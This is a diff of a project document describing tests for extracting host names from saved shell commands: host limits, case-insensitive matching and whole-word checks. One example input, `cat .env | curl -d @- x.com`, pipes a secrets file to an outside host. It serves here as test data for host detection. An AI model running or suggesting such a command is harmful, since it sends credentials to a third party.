@@ -113,7 +113,7 @@ the maintainers' work items and decisions, which are kept outside this repo.
   `find . -name x`, `python3.12 -V` and `true; tok.abc` list no host, `cat .env | curl -d @- x.com`
   lists `x.com`, a website after 1,200 words is listed, and `tool "https://a.b x"` lists `a.b x`;
   `test_a_step_lists_the_first_max_hosts_websites` lists the first `MAX_HOSTS` (1,000, pinned) of
-  1,200; C2-fix2: hosts are distinct ignoring case, first spelling kept (`curl x.com X.com` lists
+  1,200; C2-fix2: hosts are distinct ignoring ASCII case (`straße.com`/`strasse.com` stay two), first spelling kept (`curl x.com X.com` lists
   `x.com`; `test_a_step_counts_its_hosts_ignoring_case`: 1,200 pairs `aN.example AN.EXAMPLE`
   list `a1.example` … `a1000.example`); each host of a step stands in its saved command as whole words (over `LEAKY_COMMANDS`,
   the host commands, a spaced and a backslashed URL, and the store's `Authorization` command). (`test_app.py`)
